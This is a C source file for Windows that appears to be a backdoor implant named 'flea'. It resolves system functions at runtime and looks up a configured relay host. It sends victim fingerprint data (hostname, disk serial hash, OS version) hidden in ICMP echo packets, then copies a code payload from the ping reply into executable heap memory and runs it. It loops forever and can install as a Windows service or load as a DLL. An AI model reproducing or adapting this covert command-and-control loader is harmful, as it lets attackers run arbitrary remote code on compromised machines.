#define WIN32_LEAN_AND_MEAN
#include "config.h"
#include "protocol/preboot.h"
#include "sysprop.h"

#include <windows.h>
#include <winsvc.h>
#include <iphlpapi.h>
#include <windns.h>
#include <icmpapi.h>
#include <stdio.h>
#include <assert.h>
#include <stdarg.h>

#define SERVICE_NAME L"flead"

HANDLE (*_IcmpCreateFile)(void);

BOOL WINAPI (*_IcmpCloseHandle)(HANDLE IcmpHandle);

DWORD WINAPI (*_IcmpSendEcho2)(HANDLE IcmpHandle, HANDLE Event, FARPROC ApcRoutine,
		PVOID ApcContext, DWORD DestinationAddress, LPVOID RequestData, WORD RequestSize,
		PIP_OPTION_INFORMATION RequestOptions, LPVOID ReplyBuffer, DWORD ReplySize, DWORD Timeout);

SERVICE_STATUS_HANDLE WINAPI (*_RegisterServiceCtrlHandlerW)( LPCWSTR lpServiceName,
		LPHANDLER_FUNCTION lpHandlerProc);

WINBOOL WINAPI (*_SetServiceStatus)(SERVICE_STATUS_HANDLE hServiceStatus,LPSERVICE_STATUS lpServiceStatus);
WINBOOL WINAPI (*_StartServiceCtrlDispatcherW)(CONST SERVICE_TABLE_ENTRYW *lpServiceStartTable);
WINBOOL WINAPI (*_SetServiceStatus)(SERVICE_STATUS_HANDLE hServiceStatus,LPSERVICE_STATUS lpServiceStatus);

DNS_STATUS WINAPI (*_DnsQuery_A)(PCSTR pszName,WORD wType,DWORD Options,PIP4_ARRAY aipServers,
		PDNS_RECORD *ppQueryResults,PVOID *pReserved);

WINBOOL WINAPI (*_VirtualProtect) (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);


#ifdef BUILD_SERVICE
static void __stdcall ServiceHandler(DWORD request);
static void __stdcall ServiceInit(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors);
#endif

SERVICE_STATUS_HANDLE hStatus;
SERVICE_STATUS ServiceStatus = { 0 };


int __LogPrint(LPCSTR pFile, LPCSTR pFunc, DWORD dwLineNumber, LPCSTR pFormat, ...)
{
        va_list vl;
        va_start(vl, pFormat);
	CHAR szBuffer[1024];
        vsnprintf(szBuffer, sizeof szBuffer - 1, pFormat, vl);
        va_end(vl);
	FILE *fp = NULL;
#ifdef BUILD_SERVICE
	fp = fopen("c:/log.txt", "a");
#else
	fp = stderr;
#endif
	if (fp == NULL)
		return -1;
        int ret = fprintf(fp, "%s:%s:%lu:%s\n", pFile, pFunc, dwLineNumber, szBuffer) == -1 ? -1 : 0;
#ifdef BUILD_SERVICE
	fclose(fp);
#endif
	return ret;
}

#define WriteToLog(...)   __LogPrint(__FILE__, __func__, __LINE__, __VA_ARGS__)

// #define PTR_AND(left, right) (*(UINT_PTR *)(LPVOID)&(left) = (UINT_PTR)(left) && (UINT_PTR)(right))

#define PTR_AND(left, right) (left) = (LPVOID)((left) && (right))

int InitializeFunctions()
{
	HMODULE hIphlpapi = NULL;
	HMODULE hAdvapi32 = NULL;
	HMODULE hDnsapi = NULL;
	HMODULE hKernel32 = NULL;

	LPVOID pCheck = (LPVOID)1;

	hKernel32 = GetModuleHandleA("kernel32.dll");
	PTR_AND(pCheck, hKernel32);
	
	hIphlpapi = LoadLibraryA("Iphlpapi.dll");
	PTR_AND(pCheck, hIphlpapi);

	hAdvapi32 = LoadLibraryA("Advapi32.dll");
	PTR_AND(pCheck, hAdvapi32);

	hDnsapi  = LoadLibraryA("Dnsapi.dll");
	PTR_AND(pCheck, hDnsapi);

	_VirtualProtect = (LPVOID)GetProcAddress(hKernel32,"VirtualProtect");
	PTR_AND(pCheck, _VirtualProtect);

	_IcmpCreateFile = (LPVOID)GetProcAddress(hIphlpapi,"IcmpCreateFile");
	PTR_AND(pCheck, _IcmpCreateFile);

	_IcmpSendEcho2 = (LPVOID)GetProcAddress(hIphlpapi,"IcmpSendEcho2");
	PTR_AND(pCheck, _IcmpSendEcho2);

	_IcmpCloseHandle = (LPVOID)GetProcAddress(hIphlpapi,"IcmpCloseHandle");
	PTR_AND(pCheck, _IcmpCloseHandle);

	_RegisterServiceCtrlHandlerW = (LPVOID)GetProcAddress(hAdvapi32, "RegisterServiceCtrlHandlerW");
	PTR_AND(pCheck, _RegisterServiceCtrlHandlerW);

	_SetServiceStatus = (LPVOID)GetProcAddress(hAdvapi32, "SetServiceStatus");
	PTR_AND(pCheck, _SetServiceStatus);

	_StartServiceCtrlDispatcherW = (LPVOID)GetProcAddress(hAdvapi32, "StartServiceCtrlDispatcherW");
	PTR_AND(pCheck, _StartServiceCtrlDispatcherW);

	_SetServiceStatus = (LPVOID)GetProcAddress(hAdvapi32, "SetServiceStatus");
	PTR_AND(pCheck, _SetServiceStatus);

	_DnsQuery_A = (LPVOID)GetProcAddress(hDnsapi, "DnsQuery_A");
	PTR_AND(pCheck, _DnsQuery_A);

	if (!pCheck)
		goto out;

	WriteToLog("InitializeFunctions ok");
	return 0;
out:
	WriteToLog("InitializeFunctions fail");
	return -1;
}

static VOID BuildRequestBySysProp(struct preboot_request *pRequest, const LPSYSPROP pSysProp)
{
	DWORD hash = 5381;
        for (LPCSTR p = pSysProp->szDiskSerialName; *p; p++)
                hash = hash * 33 + *p;
	pRequest->serial_hash = hash;

	pRequest->hdr.random = GetTickCount() % 0xFF;
	pRequest->hdr.mark = 0xEA;
	pRequest->version = (pSysProp->wMajorVersion << 4 | pSysProp->wMinorVersion);
	pRequest->flags = pSysProp->bInWOW64 | (pSysProp->bWorkstation << 1);
	
	INT iNameSize  = lstrlenA(pSysProp->szHostName) + 1;

	if (iNameSize > sizeof pRequest->hostname)
		iNameSize = sizeof pRequest->hostname;
	CopyMemory(pRequest->hostname, pSysProp->szHostName, iNameSize);

}

static int ExecuteBootloader(HANDLE hIcmpFile, IPAddr addr, DWORD dwCodeSize)
{
	int iRetVal = -1;

	BYTE baEchoBuffer[1024];

	for (int i = 0; i < dwCodeSize; i ++)
		baEchoBuffer[i] = i % 26 + 'a';

	BYTE cReplyBuffer[sizeof baEchoBuffer];
	if (!_IcmpSendEcho2(hIcmpFile, NULL, NULL, NULL,
			addr, baEchoBuffer, dwCodeSize, NULL,
			cReplyBuffer, dwCodeSize + sizeof(ICMP_ECHO_REPLY), 10000)) {
		WriteToLog("_IcmpSendEcho2 fail1");
		goto out;
	}

	WriteToLog("_IcmpSendEcho2 ok1");

	PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY) cReplyBuffer;
	if (pEchoReply->Status != IP_SUCCESS)
		goto out;

	if (*(LPDWORD)pEchoReply->Data != PREBOOT_BOOTLOADER_SIGNATURE)
		goto out;

	VOID(*pBootLoader)() = HeapAlloc(GetProcessHeap(), 0, pEchoReply->DataSize);
	if (!pBootLoader)
		goto out;

	DWORD dwOldProt;
	if (!VirtualProtect(pBootLoader, pEchoReply->DataSize, PAGE_EXECUTE_READWRITE, &dwOldProt))
		goto out;

	WriteToLog("payload check ok");

	CopyMemory(pBootLoader, pEchoReply->Data, pEchoReply->DataSize);
	pBootLoader();

	WriteToLog("payload exec over");

	iRetVal = 0;
out:
	return iRetVal;
}

static int SendPrebootRequest(HANDLE hIcmpFile, IPAddr addr, const LPSYSPROP pSysProp, LPDWORD pCodeSize)
{
	int iRetVal = -1;

	struct preboot_request request;
	BuildRequestBySysProp(&request, pSysProp);

	BYTE baEchoBuffer[1024];
	preboot_encode(&request.hdr, sizeof request, baEchoBuffer);

	BYTE cReplyBuffer[sizeof baEchoBuffer + PREBOOT_REQUEST_DATA_SIZE];
	SetLastError(0);
	if (!_IcmpSendEcho2(hIcmpFile, NULL, NULL, NULL,
			addr, baEchoBuffer, PREBOOT_REQUEST_DATA_SIZE, NULL,
			cReplyBuffer, PREBOOT_REQUEST_DATA_SIZE  + sizeof(ICMP_ECHO_REPLY), 10000)) {
		WriteToLog("_IcmpSendEcho2 fail %d", GetLastError());
		goto out;
	}
	WriteToLog("_IcmpSendEcho2 ok");

	PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY) cReplyBuffer;
	if (pEchoReply->Status != IP_SUCCESS)
		goto out;

	if (pEchoReply->DataSize != PREBOOT_REQUEST_DATA_SIZE)
		goto out;

	struct preboot_reply reply = { 0 };
	preboot_decode(pEchoReply->Data, pEchoReply->DataSize, &reply.hdr);

	if (reply.hdr.mark != PREBOOT_MARK_REPLY_BOOT)
		goto out;

	if (reply.payload_size > 1024 || reply.payload_size < 256) // Maybe invalid size of payload
		goto out;

	*pCodeSize = reply.payload_size;

	iRetVal = 0;
out:
	return iRetVal;
}

VOID PrebootProc()
{

	HANDLE hIcmpFile = INVALID_HANDLE_VALUE;
	hIcmpFile = _IcmpCreateFile();
	if (hIcmpFile == INVALID_HANDLE_VALUE)
		return;
	while (1) {

		SYSPROP SysProp;
		if (GetSysProp(&SysProp))
			break;
		PDNS_RECORD pDnsRecord;
		if (_DnsQuery_A(CONFIG_RELAY_HOST, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &pDnsRecord, NULL))
		// if (_DnsQuery_A("163.com", DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &pDnsRecord, NULL))
			goto Delay;

		WriteToLog("IP = %X\n", pDnsRecord->Data.A.IpAddress);

		DWORD dwBootLoaderSize;
		if (SendPrebootRequest(hIcmpFile, pDnsRecord->Data.A.IpAddress, &SysProp, &dwBootLoaderSize))
			goto Delay;
		if (ExecuteBootloader(hIcmpFile, pDnsRecord->Data.A.IpAddress, dwBootLoaderSize))
			goto Delay;
Delay:
		Sleep(1000);

	}
}

#ifndef BUILD_SERVICE

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{

	if (InitializeFunctions()) {
		WriteToLog("InitializeFunctions");
		exit(EXIT_FAILURE);
	}
	PrebootProc();
	return 0;
}

#else

void WINAPI ServiceInit(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors)
{
	ServiceStatus.dwWaitHint = 1000;
	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	hStatus = _RegisterServiceCtrlHandlerW(SERVICE_NAME, ServiceHandler);
	if(hStatus == 0)
		return;

	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	_SetServiceStatus(hStatus, &ServiceStatus);
	WriteToLog("running");

	PrebootProc();
	
	ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	_SetServiceStatus(hStatus, &ServiceStatus);
}

void WINAPI ServiceHandler(DWORD request)
{
	if (request == SERVICE_CONTROL_STOP) {
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		_SetServiceStatus (hStatus, &ServiceStatus);
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	WriteToLog("DllMain");
	return TRUE;
}

VOID FleaMain(HWND hWnd, HINSTANCE hInst, LPSTR lpCmdLine, int nCmdShow)
{
	SERVICE_TABLE_ENTRYW ServiceTable[] = {
		{ SERVICE_NAME, &ServiceInit },
		{ NULL,NULL},
	};

	if (InitializeFunctions()) {
		WriteToLog("InitializeFunctions");
		exit(EXIT_FAILURE);
	}
	WriteToLog("begin");

	_StartServiceCtrlDispatcherW(ServiceTable);
}

#endif
